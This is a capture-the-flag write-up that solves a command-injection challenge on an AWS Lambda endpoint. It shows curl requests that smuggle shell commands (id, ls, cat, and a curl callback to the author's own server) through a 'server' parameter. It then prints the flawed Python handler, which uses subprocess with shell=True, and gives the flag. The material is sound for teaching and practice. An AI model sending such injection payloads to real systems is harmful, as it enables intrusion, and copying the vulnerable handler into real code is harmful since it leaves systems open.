# Solution - by bashNinja

Testing the expected functionality:

```
$ curl -G --data-urlencode "server=192.168.0.1" "https://n234dtjo39.execute-api.us-west-2.amazonaws.com/default/myFun2020_002"
"Convert an IP address to a /24 Network Block!b'192.168.0.0/24\\n'"
```

So there's some sort of injection here. I smashed at SQL injection for a while. Even ran SQLMap and got 0.

Then I played with command injection.

This command changed the output to nothing! That's great:

```
$ curl -G --data-urlencode "server=;which curl;" "https://n234dtjo39.execute-api.us-west-2
.amazonaws.com/default/myFun2020_002"
"Convert an IP address to a /24 Network Block!b''"m
```

I then attempted to see if it was actually running the commands, so I had it hit a webserver I controlled and checked if anything hit it.

```
$ curl -G --data-urlencode "server=;curl thebash.ninja;" "https://n234dtjo39.execut
e-api.us-west-2.amazonaws.com/default/myFun2020_002"
"Convert an IP address to a /24 Network Block!b''"m
```

Same response as before, but my webserver said it got a hit from curl!! That meant it was running the commands, but not showing them. So I played with the output until I figured out what was going on. It was filtering the OUTPUT.

This produced results:

```
$ curl -G --data-urlencode "server=;id;192.168.0.1" "https://n234dtjo39.execute-api.us-west-2.amazonaws.com/default/myFun2020_002"
"Convert an IP address to a /24 Network Block!b'\\nuid=994(sbx_user1051) gid=991 groups=991\\n'"
```

Sweet. Command injection! What now... Dig around? Usually we don't have to dig around much, so we'll stick in the current directory.

```
$ curl -G --data-urlencode "server=;ls;1.1.1.1" "https://n234dtjo39.execute-api.us-west-2.
amazonaws.com/default/myFun2020_002"
"Convert an IP address to a /24 Network Block!b'\\nlambda_function.py\\n'"

$ curl -G --data-urlencode "server=;cat *;1.1.1.1" "https://n234dtjo39.execute-api.us-west
-2.amazonaws.com/default/myFun2020_002"
"Convert an IP address to a /24 Network Block!b'\\nimport json\\n\\n# FLAG / KEY: wheelsAMOUNThill\\n\\nimport subprocess\\n\\ndef lambda_handler(event, context):\\n    # @TweekFawkes\\n    sReturn = \\'Convert an IP address to a /24 Network Block!\\'\\n    #\\n    headers = event[\\'headers\\']\\n    #\\n    if \\'queryStringParameters\\' in event:\\n        dQueryStringParameters = event[\\'queryStringParameters\\']\\n        if \\'server\\' in dQueryStringParameters:\\n            sServerGetParm = str(dQueryStringParameters[\\'server\\'])\\n            result = subprocess.run(\\'echo \\' + sServerGetParm + \\'\\' + \" | sed \\'s:[^.]*$:0/24:\\'\", stdout=subprocess.PIPE, shell=True)\\n            sReturn = sReturn + str(result.stdout)\\n    #\\n    return {\\n        \\'statusCode\\': 200,\\n        \\'body\\': json.dumps(sReturn)\\n    }\\n'"
```

Bam, flag.

# Real Life Application

This is 100% possible in real life. Poor coding will produce these kinds of results. To protect against this, send your programmers to "secure coding" classes and put your application through _OPEN_ SOURCE CODE Pentests. They'll find this kind of stuff if your programmers missed it.

# Flag

wheelsAMOUNThill
